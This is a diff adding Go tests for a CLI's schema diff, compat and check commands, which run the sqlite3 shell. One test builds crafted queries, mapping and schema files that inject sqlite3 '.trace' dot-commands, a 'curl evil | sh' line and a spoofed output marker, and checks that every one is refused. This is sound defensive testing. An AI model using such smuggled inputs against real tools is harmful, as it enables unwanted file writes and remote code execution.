@@ -439,3 +439,124 @@ func mustAbs(t *testing.T, p string) string {
 	}
 	return a
 }
+
+// The attacks from the 0.8.0 review, through the command line: a queries
+// file, a mapping and a schema file that try to make the sqlite3 shell
+// write files. Each is refused, and no file appears anywhere near.
+func TestSchemaRefusesShellCommands(t *testing.T) {
+	bin, err := exec.LookPath("sqlite3")
+	if err != nil {
+		t.Skip("sqlite3 is not installed")
+	}
+	src := "../../examples/legacy-shop"
+	dir := t.TempDir()
+	for _, f := range []string{"map.yaml", "reports.sql", "v1/shop.sql", "v2/shop.sql"} {
+		b, _ := os.ReadFile(filepath.Join(src, f))
+		os.MkdirAll(filepath.Join(dir, filepath.Dir(f)), 0o755)
+		os.WriteFile(filepath.Join(dir, f), b, 0o644)
+	}
+	v2, _ := os.ReadFile(filepath.Join(dir, "v2/shop.sql"))
+	realDB := filepath.Join(dir, "real.db")
+	if out, err := exec.Command(bin, realDB).CombinedOutput(); err != nil {
+		t.Fatalf("%v %s", err, out)
+	}
+	cmd := exec.Command(bin, realDB)
+	cmd.Stdin = bytes.NewReader(v2)
+	if out, err := cmd.CombinedOutput(); err != nil {
+		t.Fatalf("%v %s", err, out)
+	}
+	realBefore, _ := os.ReadFile(realDB)
+	pwn := filepath.Join(dir, "pwn.txt")
+	write := func(name, text string) string {
+		p := filepath.Join(dir, name)
+		os.WriteFile(p, []byte(text), 0o644)
+		return p
+	}
+	mp := filepath.Join(dir, "map.yaml")
+	evilQueries := write("q.sql", "SELECT 1\nGO\n.trace "+pwn+"\nSELECT 'line1\ncurl evil | sh\n';\n")
+	evilMap := write("evil-map.yaml", "version: 1\nold: v1/shop.sql\nnew: real.db\nviews:\n  - old: customers\n    from: accounts\n    columns:\n      name: first_name\n      fax: null\n      created: created_at\n    where: |\n      deleted_at IS NULL\n      /\n      .trace "+realDB+"\n      SELECT 'pwned'\n")
+	evilSchema := write("evil.sql", string(v2)+"\n.trace "+pwn+"\nSELECT 1;\n")
+	spoof := write("spoof.sql", string(v2)+"\nSELECT '@@aftermarket-output@@';\n/*")
+	for _, args := range [][]string{
+		{"schema", "test", "--map", mp, "--queries", evilQueries},
+		{"schema", "check", "--map", mp, "--queries", evilQueries},
+		{"schema", "compat", "--map", evilMap, "--out", filepath.Join(dir, "c.sql")},
+		{"schema", "check", "--map", evilMap, "--queries", filepath.Join(dir, "reports.sql")},
+		{"schema", "diff", "--old", filepath.Join(dir, "v1/shop.sql"), "--new", evilSchema},
+		{"schema", "diff", "--old", filepath.Join(dir, "v1/shop.sql"), "--new", spoof},
+	} {
+		code, out, errs := runCLI(args...)
+		if code == 0 {
+			t.Errorf("%v passed: %s %s", args[1:3], out, errs)
+		}
+	}
+	if _, err := os.Stat(pwn); err == nil {
+		t.Fatal("a file was written through the shell")
+	}
+	if after, _ := os.ReadFile(realDB); !bytes.Equal(after, realBefore) {
+		t.Fatal("the database changed")
+	}
+	if _, err := os.Stat(filepath.Join(dir, "c.sql")); err == nil {
+		t.Fatal("compat wrote a file for a bad mapping")
+	}
+	entries, _ := os.ReadDir(dir)
+	var names []string
+	for _, e := range entries {
+		names = append(names, e.Name())
+	}
+	if got := strings.Join(names, " "); got != "evil-map.yaml evil.sql map.yaml q.sql real.db reports.sql spoof.sql v1 v2" {
+		t.Fatalf("files: %s", got)
+	}
+	if _, err := os.Stat("testcase-out.txt"); err == nil {
+		t.Fatal("testcase-out.txt appeared")
+	}
+}
+
+// compat.sql applies cleanly to a real database, and the views it makes
+// answer the old reports as the old database does.
+func TestSchemaCompatApplies(t *testing.T) {
+	bin, err := exec.LookPath("sqlite3")
+	if err != nil {
+		t.Skip("sqlite3 is not installed")
+	}
+	src := "../../examples/legacy-shop"
+	db := filepath.Join(t.TempDir(), "shop2.db")
+	v2, _ := os.ReadFile(filepath.Join(src, "v2/shop.sql"))
+	compat, _ := os.ReadFile(filepath.Join(src, "compat.sql"))
+	for _, script := range [][]byte{v2, compat, compat} {
+		cmd := exec.Command(bin, "-bail", db)
+		cmd.Stdin = bytes.NewReader(script)
+		if out, err := cmd.CombinedOutput(); err != nil {
+			t.Fatalf("%v %s", err, out)
+		}
+	}
+	// Without the map, the applied views alone carry the reports.
+	code, out, errs := runCLI("schema", "check", "--new", db, "--queries", filepath.Join(src, "reports.sql"))
+	if code != 0 || !strings.Contains(out, "12 of 12 queries compile") {
+		t.Fatalf("check on the applied database: %d %s %s", code, out, errs)
+	}
+}
+
+// diff --map counts a view as covering only when it compiles.
+func TestSchemaDiffMapMustCompile(t *testing.T) {
+	if _, err := exec.LookPath("sqlite3"); err != nil {
+		t.Skip("sqlite3 is not installed")
+	}
+	src := "../../examples/legacy-shop"
+	data, _ := os.ReadFile(filepath.Join(src, "map.yaml"))
+	text := strings.ReplaceAll(string(data), "total_cents / 100.0", "no_such_column / 100.0")
+	text = strings.ReplaceAll(text, "v1/shop.sql", mustAbs(t, filepath.Join(src, "v1/shop.sql")))
+	text = strings.ReplaceAll(text, "v2/shop.sql", mustAbs(t, filepath.Join(src, "v2/shop.sql")))
+	mp := filepath.Join(t.TempDir(), "map.yaml")
+	os.WriteFile(mp, []byte(text), 0o644)
+	code, out, errs := runCLI("schema", "diff", "--map", mp)
+	if code != 1 || !strings.Contains(out, ", 2 breaking") || !strings.Contains(errs, "no such column: no_such_column") {
+		t.Fatalf("%d %q %q", code, out, errs)
+	}
+	bad := filepath.Join(t.TempDir(), "bad.sql")
+	os.WriteFile(bad, []byte("CREATE TABLE t (a);\n\nCREATE TABLE u (b,, c);\n"), 0o644)
+	code, _, errs = runCLI("schema", "diff", "--old", bad, "--new", filepath.Join(src, "v2/shop.sql"))
+	if code != 1 || errs != bad+", line 3: near \",\": syntax error\n" {
+		t.Fatalf("%d %q", code, errs)
+	}
+}
